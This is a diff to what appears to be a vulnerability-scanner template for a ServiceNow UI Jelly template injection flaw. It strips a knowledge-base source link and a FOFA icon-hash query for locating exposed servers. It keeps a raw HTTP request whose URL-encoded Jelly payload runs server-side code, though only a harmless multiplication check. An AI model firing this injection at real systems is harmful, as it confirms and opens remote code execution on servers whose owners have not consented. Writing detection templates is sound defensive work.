@@ -3,12 +3,8 @@ info:
   name: ServiceNow UI Jelly模板注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rdsmh27p7pvls05a'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rdsmh27p7pvls05a
-    fofa: icon_hash="1701804003"
 http:
 - raw:
   - 'GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(11111*11111);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E HTTP/1.1
